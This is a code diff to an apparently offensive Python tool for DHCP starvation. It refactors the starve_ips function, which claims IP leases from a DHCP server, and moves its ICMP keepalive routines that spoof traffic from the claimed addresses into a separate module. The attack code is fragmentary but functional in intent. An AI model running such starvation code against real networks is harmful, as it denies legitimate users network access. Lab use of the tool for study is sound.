@@ -10,6 +10,8 @@ import mac
 from types import SimpleNamespace
 import logging
 
+import keepalive
+
 logger = logging.getLogger()
 
 IP_GLOBAL_BROADCAST='255.255.255.255'
@@ -257,7 +259,7 @@ def is_bootp_reply(packet)->bool:
 
 
 
-def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5)->list[tuple[str, str, str]]:
+def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5, keep_alive = False)->list[tuple[str, str, str]]:
     """
     TODO check if dhcp request if acked
     TODO warn about NAKs
@@ -281,8 +283,8 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         
         time.sleep(time_to_wait)
         
-        keep_alive_thread = threading.Thread(target=keep_ips_alive_icmp, args=[occupied_ips, server_ip, server_mac])
-        if((args.keep_alive_while_starving) and (len(occupied_ips) != 0)):
+        if(keep_alive and (len(occupied_ips) != 0)):
+            keep_alive_thread = threading.Thread(target=keepalive.keep_ips_alive_icmp, args=[occupied_ips, server_ip, server_mac])
             logger.info(f"{function_name} : keeping alive while starving")
             keep_alive_thread.start()
 
@@ -335,20 +337,3 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
     return occupied_ips
 
 
-def sendp_icmp(src_ip : str, src_mac : str, dst_ip : str, dst_mac : str, interface : str = conf.iface):
-    
-    function_name = inspect.currentframe().f_code.co_name
-    
-    packet = Ether(dst = dst_mac, src = src_mac , type='IPv4')\
-            / IP(src = src_ip, dst = dst_ip)\
-            / ICMP()
-    logger.debug(f"{function_name} : sending {packet} to {dst_ip},{dst_mac} via {interface}")
-    
-    sendp(packet, iface=interface)
-
-def keep_ips_alive_icmp(devices : list[tuple[str,str]], dhcp_server_ip : str, dhcp_server_mac : str):
-    function_name = inspect.currentframe().f_code.co_name
-    logger.info(f"{function_name} : keeping alive these ips : {devices}")
-    
-    for device in devices:
-        sendp_icmp(dst_ip=dhcp_server_ip, dst_mac=dhcp_server_mac,src_ip=device[0], src_mac=device[1], interface=device[2])
